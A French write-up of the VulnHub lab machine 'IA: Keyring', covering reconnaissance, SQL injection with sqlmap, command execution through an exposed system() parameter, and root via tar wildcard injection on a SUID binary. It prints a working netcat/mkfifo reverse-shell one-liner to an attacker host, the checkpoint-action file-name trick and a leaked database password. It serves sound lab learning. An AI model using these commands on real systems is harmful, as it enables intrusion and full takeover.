# WRITE-UP IA: KEYRING (1.0.1)

Ce document est un write-up pour la machine IA: KEYRING de vulnhub ([IA: Keyring (1.0.1) ~ VulnHub](https://www.vulnhub.com/)). Toutes les manipulations effectuées dans ce document ont été réalisées dans un environnement de type "bac à sable" et ne doivent être dans aucun cas reproduites dans un environnement non contrôlé ou à des fins malveillantes.

**NIVEAU VULNHUB : MEDIUM**

---

## Partie 1 : Reconnaissance

Pour le moment les seules informations dont on dispose sont celles sur le site de vulnhub.

Les machines attaquante et victime tournent toutes les deux sur VirtualBox en mode réseau privé hôte.

**Machine attaquante :**
- OS : Kali Linux
- IP : 192.168.56.101

**Machine victime :**
- OS : ?
- IP : Récupérée par DHCP

Pour commencer, nous allons faire une reconnaissance du réseau à l'aide d'un scan Nmap.

```bash
nmap -sP 192.168.56.0/24
```

`-sP` : scan de ping

Ici on utilise l'option -sP pour que le scan soit plus rapide.

![Résultat nmap -sP](images/page2_nmap_sp.png)

OK, on obtient 4 adresses, les deux premières sont les adresses du serveur DHCP et de la route par défaut du réseau. Nous avons la **.101** donc celle qui nous intéresse ici est la **.104**.

Super, maintenant on peut faire un scan nmap plus précis sur la machine à attaquer.

```bash
nmap -sC -sV 192.168.56.104
```

`-sC` : Exécute des scripts par défaut pour détecter des vulnérabilité  
`-sV` : Énumère les versions des services

![Résultat nmap -sC -sV](images/page3_nmap_scv.png)

On obtient donc :
- **Le port 22/tcp ssh ouvert**, ça nous sera surement utile plus tard pour nous connecter à la machine victime
- **Le port 80/tcp ouvert.**

Allons voir ce qu'il se passe sur le port HTTP.

![Page Sign Up](images/page3_signup.png)

On arrive directement sur une page de création d'utilisateur, on va lancer un scan **Gobuster** pour chercher les eventuel fichiers et répertoire accessible depuis http://192.168.56.104

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.56.104 -t 50 -x txt,html,php
```

`dir` : Mode "brute force de répertoire/fichiers"  
`-w` : Wordlist utilisé  
`-u` : Cible  
`-t` : Nombre de requêtes envoyé simultanément  
`-x` : Test chaque mot de la wordlist avec les extensions txt, html et php

![Résultat Gobuster](images/page4_gobuster.png)

On obtient quelques résultats qui peuvent être intéressant, pour le moment on va essayer de créer un utilisateur et de voir ce qu'il se passe.

![Dashboard home.php](images/page4_dashboard.png)

On arrive sur un dashboard, après avoir fouillé un petit peu partout je n'ai rien trouvé.

Allons voir ce qui se trouve sur la page **/history.php**

![Page history.php blanche](images/page5_history_blank.png)

Ok, une page blanche… Il faut probablement lui passer un paramètre.

---

## Partie 1 : Exploit

On va utiliser l'outil **FUZZ** pour essayer de trouver le paramètre à utiliser pour lister l'historique de l'utilisateur que l'on vient de créer.

J'ai d'abord eu aucun résultat, puis je me suis rappelé que nous étions connectés en tant que **test1**. Essayons de refaire un test en mettant en paramètre notre cookie de session.

```bash
wfuzz -u "http://192.168.56.104/history.php?FUZZ=test1" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b "PHPSESSID=hmvfrm2hp3rl601tp62a5vafjl" -hw 0
```

`-u` : Cible  
`-w` : wordlist à utiliser  
`-hw 0` : N'affiche que les réponses qui on aboutit  
`-b` : Notre cookie de session

![Résultat wfuzz](images/page6_wfuzz.png)

Cette fois ci on trouve bien quelque chose, le paramètre **user** semble fonctionner allons voir.

![history.php?user=test1](images/page6_history_test1.png)

Voyons voir si ça marche avec d'autres utilisateurs. J'ai essayé naïvement avec admin.

![history.php?user=admin](images/page6_history_admin.png)

Une page github ? Allons voir.

![GitHub cyberbot75/keyring](images/page7_github.png)

Il y a tout le code source des pages. Après avoir fouillé un petit peu on j'ai trouvé quelque chose d'intéressant sur la page **control.php**.

```php
<?php
session_start();
if(isset($_SESSION['name']))
{
    $servername = "localhost";
    $username = "root";
    $password = "sqluserrootpassw0r4";
    $database = "users";

    $conn = mysqli_connect($servername, $username, $password, $database);
    $name = $_SESSION['name'];
    $date = date('Y-m-d H:i:s');
    echo "HTTP Parameter Pollution or HPP in short is a vulnerability that occurs<br>due to passing of multiple parameters";
        $sql = "insert into log (name, page_visited, date_time) values ('$name','control','$date')";

        if(mysqli_query($conn,$sql))
        {
            echo "<br><br>";
            echo "Date & Time : ".$date;
        }
        system($_GET['cmdcntr']); //system() function is not safe to use , dont' forget to remove it in production .
}
else
```

On a donc le mot de passe de l'utilisateur root pour une base de données ainsi qu'une fonction qui ne serait pas **"safe"**. Essayons de voir ce qu'on peut faire avec le paramètre **cmdcntr**.

Aucun résultat.

A partir de là je suis resté bloqué un moment. Puis j'ai voulu aller voir ce qui avait dans la BDD pour cela comme aucun port MySql est ouvert on va essayer de voir si on ne peut pas faire une injection sql depuis la page **history.php**.

Grâce à l'outil **sqlmap** on arrive finalement à dump la base de donnée

```bash
sqlmap -u "http://192.168.56.104/history.php?user=test1" --cookie="PHPSESSID=hmvfrm2hp3rl601tp62a5vafjl" --dump
```

`-u` : Cible  
`--cookie` : Cookie de session  
`--dump` : On demande à sqlmap de "dump" c'est à dire stocker les données quand il trouve une faille.

![Résultat sqlmap dump](images/page8_sqlmap.png)

On a donc le mot de passe admin pour le site. Réessayons notre paramètre **cmdcntr** en étant logger avec l'admin.

J'ai d'abord essayé d'obtenir le contenu du fichier **/etc/passwd** mais sans succès mais la commande **whoami** fonctionne, il semble que ce paramètre exécute du code sur le serveur.

![control.php?cmdcntr=whoami](images/page9_whoami.png)

J'ai ensuite récupéré un reverse shell sur [Online - Reverse Shell Generator](https://www.revshells.com/). On va utiliser la suite burp pour l'encoder dans le langage url.

![Reverse shell encodé dans Burp](images/page9_burp.png)

On lance une écoute sur notre machine attaquante et on envoie l'url.

![Connexion reverse shell nc](images/page9_nc.png)

Super, avant de continuer on va rendre le reverse shell plus propre.

```bash
export TERM=xterm;python -c 'import pty;pty.spawn("/bin/bash")'
```

Pour chercher le premier flag il faut être connecté en tant que **john**. Bonne nouvelle nous avons eu un login/mot de passe pour **john** quand nous avons dump la BDD. Essayons de se connecter en tant que **john**.

![su john](images/page10_su_john.png)

Maintenant on peut récupérer le premier flag.

![cat user.txt](images/page10_flag_user.png)

Notre but maintenant va être d'avoir les droits **root**.

---

## Partie 3 : Elévation de privilèges

Commençons par lister les commandes que **john** peut exécuter avec des droits root.

![sudo -l](images/page10_sudo_l.png)

Rien de ce côté.

Peut être des choses intéressantes dans le fichier crontab ?

![cat /etc/crontab](images/page11_crontab.png)

Non plus…

Pour finir on va regarder si des fichiers intéressant possèdent le bit SUID.

```bash
find / -user root -perm /4000 2>&1 | grep -v "Permission"
```

![Résultat find SUID](images/page11_suid.png)

Ok, le fichier **/home/john/compress** à un bit SUID et appartient à root, c'est surement par là qu'il faut chercher.

Voyons voir le contenu.

![cat /home/john/compress](images/page12_compress_cat.png)

On va récupérer ce fichier sur notre machine attaquante en lançant un serveur web sur la machine victime, ce sera plus simple.

Le fichier à l'air compilé en binaire, ouvrons le avec **ghidra** pour le décompiler et tenter d'y voir plus clair.

![Ghidra décompilation](images/page12_ghidra.png)

On a donc cette fonction, essayons de comprendre ce qu'elle fait.

Les lignes **setgid(0)** et **setuid(0)** force le script à exécuter la suite en tant que root, peu importe qui lance le script.  
Après, le script exécute la commande **/bin/tar cf archive.tar \***.  
C'est cette ligne qui va nous permettre de passer root.  
Cette ligne nous permet d'utiliser un exploit bien connu, le **Tar Wildcard Injection**.

Notre but va être de créer des fichiers pour que la commande tar les voit comme des options du type **--help**.

On va donc créer un fichier **shell.sh** avec un reverse shell à l'interieur, un fichier vide qui s'appelle `"--checkpoint=1"` et un autre qui s'appelle `"--checkpoint-action=exec=sh shell.sh"`.

Récapitulons, si tout ce passe bien quand on va exécuter le script **compress**, la commande **/bin/tar cf archive.tar \*** va se lancer comme si on exécutait cette commande : **/bin/tar cf archive.tar shell.sh --checkpoint=1 --checkpoint-action=exec=sh shell.sh**

Ducoup, qu'est ce que va faire exactement cette commande, elle va commencer par archiver shell.sh puis les deux autres fichiers seront vu comme des options qui disent : "à chaque fois que tu archive un fichier (**--checkpoint=1**) exécute dans le shell le script shell.sh (**--checkpoint-action=exec=sh shell.sh**)" et tout ça en tant que root à cause des deux lignes avant.

Comme on a mis un reverse shell dans le fichier **shell.sh**, il nous suffit d'écouter sur le port 4444 avec notre machine attaquante et on devrait avoir un shell en tant que root.

Place à la pratique.

![Création des fichiers shell.sh, checkpoint](images/page13_create_files.png)

On exécute le script.

![./compress erreur](images/page13_compress_error.png)

La théorie semble incorrecte…  
Essayons avec un autre reverse shell

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.0.2.4 4444 >/tmp/f
```

![Connexion root](images/page14_root.png)

Nous voilà **root**, on peut récupérer le flag et la machine est finie.
